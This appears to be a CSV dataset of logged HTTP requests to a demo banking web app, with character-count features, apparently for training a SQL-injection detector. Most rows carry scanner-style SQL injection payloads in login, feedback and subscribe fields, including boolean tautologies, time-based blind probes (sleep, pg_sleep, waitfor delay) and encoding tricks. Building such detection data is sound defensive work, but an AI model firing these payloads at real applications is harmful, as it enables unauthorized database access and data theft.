method,path,body,single_q,double_q,dashes,braces,spaces,badWords,type
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%00%c0%a7%c0%a2,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=%bf'%bf%22&uid=1,1,1,0,0,0,1,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1%3d1%20AND%20528%3d528%20or%20'QrEyoGkc'%3d'&uid=1,4,0,0,0,6,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%40%402FzY5&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1%22%20OR%202%2b48-48-1%3d0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,1,1,0,4,0,0
GET,/survey_questions.jsp?step=3kT7Ft26'));select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,0
GET,/index.jsp?content=fgb7urN4,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=%f0''%f0%22%22&uid=1,2,2,0,0,0,1,0
GET,/,,0,0,0,0,0,18,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=JyI%3d&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20528%3d528%20AND%203%2b1-1-1%3d1%20or%20'QrEyoGkc'%3d'&uid=1,4,0,0,0,6,1,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b241-241-1%3d0%2b0%2b0%2b1%20or%20'Xr8a6n0P'%3d',4,0,0,0,4,0,0
GET,/index.jsp?content=1'%22,,1,1,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/&email_addr=sample%40email.tst&name=dudxbugh&subject=1,2,2,0,14,0,3,0
GET,/index.jsp?content=personal_loans.htm'%20AND%202*3*8%3d6*8%20AND%20'GhMC'%3d'GhMC,,4,0,0,0,4,0,0
POST,/doLogin,btnSubmit=Login&passw=(select%20convert(int%2cCHAR(65)))&uid=1,0,0,0,3,1,2,0
GET,/,,0,0,0,0,0,4,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%bf'%bf%22&name=tquhvjrr&subject=1,1,1,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2%3d5%20AND%20528%3d528%20or%20'QrEyoGkc'%3d'&uid=1,4,0,0,0,6,1,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%22%20OR%202%2b227-227-1%3d0%2b0%2b0%2b1%20--%20,0,1,1,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/&email_addr=sample%40email.tst&name=dudxbugh&subject=1,2,2,0,15,0,9,0
GET,/index.jsp?content=%5c,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1'%22,1,1,0,0,0,1,0
GET,/index.jsp?content=personal_loans.htm%22%20AND%202*3*8%3d6*8%20AND%20%22DF4z%22%3d%22DF4z,,0,4,0,0,4,0,0
GET,/,,0,0,0,0,0,4,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%f0''%f0%22%22&name=tquhvjrr&subject=1,2,2,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2%3d6%20AND%20528%3d528%20or%20'QrEyoGkc'%3d'&uid=1,4,0,0,0,6,1,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/,2,2,0,14,0,3,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1;%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,2,0,1,0,5,2,0
GET,/index.jsp?content=1%00%c0%a7%c0%a2,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%5c,0,0,0,0,0,1,0
GET,/,,0,0,0,0,0,4,0
GET,/index.jsp?content=personal_loans.htm%25'%20AND%202*3*8%3d6*8%20AND%20'gcOd'%21%3d'gcOd%25,,4,0,0,0,4,0,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/,2,2,0,15,0,9,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0%3d6%20AND%20528%3d528%20or%20'QrEyoGkc'%3d'&uid=1,4,0,0,0,6,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=(select%20convert(int%2cCHAR(65)))&name=tquhvjrr&subject=1,0,0,0,3,1,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1);%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,2,0,1,0,5,2,0
GET,/index.jsp?content=%40%40cpBR0,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%00%c0%a7%c0%a2,0,0,0,0,0,1,0
GET,/,,0,0,0,0,0,4,0
GET,/index.jsp?content=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/,,2,2,0,14,0,3,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,5,2,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1%3d6%20AND%20528%3d528%20or%20'QrEyoGkc'%3d'&uid=1,4,0,0,0,6,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,2,0,1,0,5,2,0
GET,/index.jsp?content=JyI%3d,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,4,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%40%40GLv0Y,0,0,0,0,0,1,0
GET,/index.jsp?content=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,,2,2,0,15,0,9,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b593-593-1%3d0%2b0%2b0%2b1%20or%20'0NvpAAU3'%3d'&uid=1,4,0,0,0,4,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1'%22&subject=1,1,1,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=SOS0RobR';%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,3,0,1,0,5,2,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=zrO9JDUl';%20waitfor%20delay%20'0:0:3'%20--%20,3,0,1,0,5,2,0
GET,/index.jsp?content=%bf'%bf%22,,1,1,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JyI%3d,0,0,0,0,0,1,0
GET,/default.jsp?content=security.htm,,0,0,0,0,0,0,0
GET,/index.jsp?content=1%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2b593-593-1%3d0%2b0%2b0%2b1%20or%20'0NvpAAU3'%3d'&uid=1,4,0,0,0,4,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%5c&subject=1,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1;select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,1,1,3,2,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=xqGtnGL0';select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,0
GET,/index.jsp?content=%f0''%f0%22%22,,2,2,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%bf'%bf%22,1,1,0,0,0,1,0
GET,/index.jsp?content=U5YhpwwN';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b593-593)%20or%20'0NvpAAU3'%3d'&uid=1,4,0,0,1,4,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%00%c0%a7%c0%a2&subject=1,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1);select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,1,1,3,2,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%f0''%f0%22%22,2,2,0,0,0,1,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=bnhS5H8k');select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,0
GET,/index.jsp?content=(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%40%40EF2bJ&subject=1,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b593-593)%20or%20'0NvpAAU3'%3d'&uid=1,4,0,0,1,4,1,0
GET,/index.jsp?content=pjl4anXY';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,0
GET,/default.jsp?content=4oe11cM9,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=(select%20convert(int%2cCHAR(65))),0,0,0,3,1,2,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=ySKxjL4N'));select%20pg_sleep(6);%20--%20,1,0,1,1,3,2,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1));select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,1,1,3,2,0
GET,/default.jsp?content=1'%22,,1,1,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1%3d1%20AND%20000593%3d000593%20or%20'0NvpAAU3'%3d'&uid=1,4,0,0,0,6,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=JyI%3d&subject=1,0,0,0,0,0,0,0
GET,/index.jsp?content=PQs5qzaQ');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,0
GET,/default.jsp?content=-1%20OR%202%2b758-758-1%3d0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=GsmXPfov';select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,1,0,1,1,3,2,0
GET,/,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
GET,/default.jsp?content=%5c,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20000593%3d000593%20AND%203%2b1-1-1%3d1%20or%20'0NvpAAU3'%3d'&uid=1,4,0,0,0,6,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%bf'%bf%22&subject=1,1,1,0,0,0,0,0
GET,/index.jsp?content=fVAELJyG'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,0
GET,/default.jsp?content=-1%20OR%202%2b509-509-1%3d0%2b0%2b0%2b1,,0,0,0,0,2,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=RA7SfPfu');select%20pg_sleep(9);%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,1,0,1,1,3,2,0
GET,/default.jsp?content=1%00%c0%a7%c0%a2,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2%3d5%20AND%20000593%3d000593%20or%20'0NvpAAU3'%3d'&uid=1,4,0,0,0,6,1,0
GET,/default.jsp?content=-1'%20OR%202%2b535-535-1%3d0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,0
GET,/,,0,0,0,0,0,0,0
GET,/default.jsp?content=%40%40IQT1S,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2%3d6%20AND%20000593%3d000593%20or%20'0NvpAAU3'%3d'&uid=1,4,0,0,0,6,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=zjdxWJD3'));select%20pg_sleep(9);%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,1,0,1,1,3,2,0
GET,/default.jsp?content=-1'%20OR%202%2b138-138-1%3d0%2b0%2b0%2b1%20or%20'FUeKWFni'%3d',,4,0,0,0,4,0,0
GET,/,,0,0,0,0,0,0,0
GET,/default.jsp?content=JyI%3d,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0%3d6%20AND%20000593%3d000593%20or%20'0NvpAAU3'%3d'&uid=1,4,0,0,0,6,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=dudxbugh&subject=1,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
GET,/default.jsp?content=-1%22%20OR%202%2b183-183-1%3d0%2b0%2b0%2b1%20--%20,,0,1,1,0,4,0,0
GET,/default.jsp?content=%bf'%bf%22,,1,1,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1%3d6%20AND%20000593%3d000593%20or%20'0NvpAAU3'%3d'&uid=1,4,0,0,0,6,1,0
GET,/,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
GET,/default.jsp?content=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/,,2,2,0,14,0,3,0
GET,/,,0,0,0,0,0,0,0
GET,/default.jsp?content=%f0''%f0%22%22,,2,2,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=htZwoaN1&name=dudxbugh&subject=1,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,0,0,0,0,0,1,0
GET,/search.jsp,,0,0,0,0,0,0,0
GET,/default.jsp?content=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,,2,2,0,15,0,9,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%f0''%f0%22%22&subject=1,2,2,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
GET,/default.jsp?content=(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,1,0
GET,/,,0,0,0,0,0,0,0
GET,/default.jsp?content=1%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=(select%20convert(int%2cCHAR(65)))&subject=1,0,0,0,3,1,1,0
GET,/search.jsp,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst'%20AND%202*3*8%3d6*8%20AND%20'EMXw'%3d'EMXw&name=dudxbugh&subject=1,4,0,0,0,4,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2b690-690-1%3d0%2b0%2b0%2b1%20--%20,0,0,1,0,4,1,0
GET,/default.jsp?content=2WukzEQ0';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst%22%20AND%202*3*8%3d6*8%20AND%20%22v6hN%22%3d%22v6hN&name=dudxbugh&subject=1,0,4,0,0,4,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,2,0
GET,/,,0,0,0,0,0,6,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2b773-773-1%3d0%2b0%2b0%2b1,0,0,0,0,2,1,0
GET,/default.jsp?content=T12bmVB4';select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst%25'%20AND%202*3*8%3d6*8%20AND%20'eh9L'%21%3d'eh9L%25&name=dudxbugh&subject=1,4,0,0,0,4,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1'%22,1,1,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b419-419-1%3d0%2b0%2b0%2b1%20--%20,1,0,1,0,4,1,0
GET,/,,0,0,0,0,0,18,0
GET,/default.jsp?content=Owm858gk');select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/&name=dudxbugh&subject=1,2,2,0,14,0,3,0
GET,/search.jsp,,0,0,0,0,0,6,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=%5c,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b619-619-1%3d0%2b0%2b0%2b1%20or%20'65sug3MC'%3d',4,0,0,0,4,1,0
GET,/,,0,0,0,0,0,4,0
GET,/default.jsp?content=Am2nXWqT'));select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/&name=dudxbugh&subject=1,2,2,0,15,0,9,0
GET,/search.jsp,,0,0,0,0,0,18,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1%00%c0%a7%c0%a2,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%22%20OR%202%2b878-878-1%3d0%2b0%2b0%2b1%20--%20,0,1,1,0,4,1,0
GET,/search.jsp,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1%20waitfor%20delay%20'0:0:6'%20--%20&name=dudxbugh&subject=1,2,0,1,0,5,2,0
GET,/,,0,0,0,0,0,4,0
GET,/index.jsp,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=%40%40zyfTj,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/,2,2,0,14,0,4,0
GET,/search.jsp,,0,0,0,0,0,4,0
GET,/,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=w0g34nhw';%20waitfor%20delay%20'0:0:9'%20--%20&name=dudxbugh&subject=1,3,0,1,0,5,2,0
GET,/,,0,0,0,0,0,4,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,2,2,0,15,0,10,0
GET,/search.jsp,,0,0,0,0,0,4,0
GET,/,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=CJvoitwA';select%20pg_sleep(3);%20--%20&name=dudxbugh&subject=1,1,0,1,1,3,2,0
GET,/,,0,0,0,0,0,4,0
GET,/index.jsp,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,5,3,0
GET,/search.jsp,,0,0,0,0,0,4,0
GET,/,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=dZ6ACOSp');select%20pg_sleep(3);%20--%20&name=dudxbugh&subject=1,1,0,1,1,3,2,0
GET,/,,0,0,0,0,0,4,0
GET,/index.jsp,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,5,3,0
GET,/search.jsp,,0,0,0,0,0,4,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=qepEzGQr'));select%20pg_sleep(6);%20--%20&name=dudxbugh&subject=1,1,0,1,1,3,2,0
GET,/,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,2,0
GET,/,,0,0,0,0,0,4,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,5,3,0
GET,/index.jsp,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,4,0
GET,/,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,4,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=LyyvLf9s';%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,3,0
GET,/index.jsp,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,4,0
GET,/,,0,0,0,0,0,2,0
GET,/search.jsp,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,4,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;select%20pg_sleep(9);%20--%20,0,0,1,1,3,3,0
GET,/search.jsp,,0,0,0,0,0,4,0
GET,/index.jsp,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=CtnZw8y3&subject=1,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=JyI%3d,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,4,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);select%20pg_sleep(3);%20--%20,0,0,1,1,3,3,0
GET,/search.jsp,,0,0,0,0,0,4,0
GET,/index.jsp,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=%bf'%bf%22,1,1,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2b331-331-1%3d0%2b0%2b0%2b1%20--%20&subject=1,0,0,1,0,4,0,0
GET,/,,0,0,0,0,0,4,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1));select%20pg_sleep(3);%20--%20,0,0,1,1,3,3,0
GET,/search.jsp,,0,0,0,0,0,4,0
GET,/search.jsp,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=%f0''%f0%22%22,2,2,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
GET,/index.jsp,,0,0,0,0,0,6,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2b706-706-1%3d0%2b0%2b0%2b1&subject=1,0,0,0,0,2,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=2O2kCGV7';select%20pg_sleep(6);%20--%20,1,0,1,1,3,3,0
GET,/search.jsp,,0,0,0,0,0,4,0
GET,/,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=(select%20convert(int%2cCHAR(65))),0,0,0,3,1,1,0
GET,/index.jsp,,0,0,0,0,0,18,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2b25-25-1%3d0%2b0%2b0%2b1%20--%20&subject=1,1,0,1,0,4,0,0
GET,/,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=Qm9sX0uk');select%20pg_sleep(6);%20--%20,1,0,1,1,3,3,0
GET,/search.jsp,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
GET,/index.jsp,,0,0,0,0,0,4,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2b501-501-1%3d0%2b0%2b0%2b1%20or%20'OKzw5vgS'%3d'&subject=1,4,0,0,0,4,0,0
GET,/,,0,0,0,0,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1Ol26CgB'));select%20pg_sleep(9);%20--%20,1,0,1,1,3,3,0
GET,/,,0,0,0,0,0,0,0
GET,/search.jsp,,0,0,0,0,0,0,0
